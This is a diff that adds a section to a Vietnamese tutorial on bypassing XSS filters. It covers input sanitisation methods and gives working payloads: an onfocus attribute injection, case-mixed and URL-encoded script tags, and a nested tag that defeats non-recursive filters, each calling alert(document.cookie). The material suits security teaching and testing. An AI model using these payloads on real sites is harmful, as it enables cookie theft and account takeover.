@@ -88,6 +88,31 @@ Các ký tự bị thay thế trong html action hoặc javascript code
 
 #### Vấn đề bypass filter
 
+Các cách bypass XSS phụ thuộc vào khả năng làm sạch input của ứng dụng web. Có một vài cơ chế của việc này như:
+* Trả lại lỗi, loại bỏ, encode, hoặc thay thế các input không hợp lệ. 
+* Một số có thể dùng blacklist hoặc whitelist các ký tự thường gặp trong payload để ngăn chặn XSS.
+
+Một vài ví dụ thú vị của việc bypass:
+
+Ví dụ 1: Giả sử ứng dụng có chứa lỗi XSS ở biến input state, mã client site là như sau:
+**<input type="text" name="state" value="INPUT_FROM_USER">**. Ứng ngăn chặn XSS bằng việc phân tích input và chặn các request có thẻ <script> trong request.
+Ta có thể bypass bằng đoạn mã sau **" onfocus="alert(document.cookie)**.
+
+Ví dụ 2: Một số kiểu encode để ofuscate bypass signature-base filter:
+
+```
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>         
+"%3cscript%3ealert(document.cookie)%3c/script%3e  
+```
+
+Ví dụ 3: Nếu Non-Recursive filter
+Có thể sử dụng payload sau:
+
+```
+<scr<script>ipt>alert(document.cookie)</script>
+```
+
 
 ***Tham khảo***
 
